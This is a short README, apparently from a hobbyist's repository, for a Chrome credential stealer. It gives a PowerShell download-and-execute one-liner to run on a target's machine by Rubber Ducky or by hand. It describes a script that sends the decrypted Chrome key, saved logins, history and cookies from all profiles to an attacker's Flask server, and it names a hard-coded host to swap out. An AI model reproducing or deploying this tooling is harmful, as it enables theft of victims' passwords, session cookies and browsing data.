this is one of my projects that i worked on when i have time.

activate `irx [url to get script] | iex` on target with a rubber duckey, or by typing into a powershell window..

`get` is a powershell script.


run `upload.py` as server to get data from target.

also change url in `get` to your server instead of `lucasz228.us.to`


`get` sends 
- decrypted chrome aes key
- chrome login data from all profiles
- chrome history from all profiles
- chrome cookies from all profiles

to the server.


## install:
```pip install flask
```
